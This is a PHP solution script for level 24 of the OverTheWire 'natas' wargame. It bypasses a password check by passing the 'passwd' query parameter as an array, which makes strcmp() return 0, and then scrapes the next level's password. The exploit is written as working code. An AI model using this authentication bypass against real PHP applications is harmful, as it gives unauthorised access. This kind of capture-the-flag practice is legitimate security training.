<?php
require_once dirname(__DIR__) . '/bootstrap.php';

$level = 24;
$username = 'natas' . $level;
$password = readFlag($level - 1);
$url = sprintf('http://%s.natas.labs.overthewire.org/', $username);

$response = $client->request('GET', $url, [
    'auth' => [$username, $password],
    'query' => ['passwd' => ['a']] //array injection (strcmp() expects parameter 1 to be string, array given) returns 0
]);

$body = (string)$response->getBody();
preg_match('/Password: (.*)<\/pre>/', $body, $flag);
echo $flag[1];
